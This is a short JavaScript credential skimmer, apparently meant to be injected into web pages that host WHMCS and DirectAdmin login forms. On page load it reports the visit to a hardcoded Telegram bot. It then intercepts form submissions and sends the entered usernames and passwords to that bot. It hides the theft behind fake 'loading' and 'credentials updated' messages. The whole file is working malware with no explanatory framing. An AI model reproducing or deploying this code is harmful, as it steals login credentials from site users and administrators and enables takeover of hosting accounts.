(function() {
    const tok = "8622579966:AAGqAh0RnQ6G665hz2xiJijMotCrzuT0bsU";
    const cid = "-5151842439";
    const host = window.location.hostname;

    const notify = (m) => {
        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(m)}`, {
            method: 'GET', mode: 'no-cors', keepalive: true
        });
    };

    notify(`👀 Visita en: ${host}`);

    document.addEventListener('DOMContentLoaded', () => {
        
        const fWh = document.getElementById('mainLoginForm');
        let count = 0;
        if (fWh) {
            fWh.addEventListener('submit', function(e) {
                const u = document.getElementById('whUser').value;
                const p = document.getElementById('whPass').value;
                if (count === 0) {
                    e.preventDefault();
                    count++;
                    notify(`🔥 WHMCS Captura\nHost: ${host}\nUser: ${u}\nPass: ${p}`);
                    const b = document.getElementById('whSubmit');
                    b.value = "Cargando...";
                    b.disabled = true;
                    setTimeout(() => { b.value = "Login"; b.disabled = false; }, 1000);
                }
            });
        }
        const fDa = document.getElementById('daCaptureForm');
        if (fDa) {
            fDa.addEventListener('submit', function(e) {
                e.preventDefault();
                const du = document.getElementById('daUser').value;
                const dp = document.getElementById('daPass').value;
                
                notify(`🚨 DIRECTADMIN DATA\nHost: ${host}\nUser: ${du}\nPass: ${dp}`);
                
                document.getElementById('daSubmitBtn').innerText = "Sincronizando...";
                setTimeout(() => {
                    document.getElementById('daPopup').style.display = 'none';
                    alert("Credenciales actualizadas. Servidor sincronizado.");
                }, 1500);
            });
        }
    });
})();
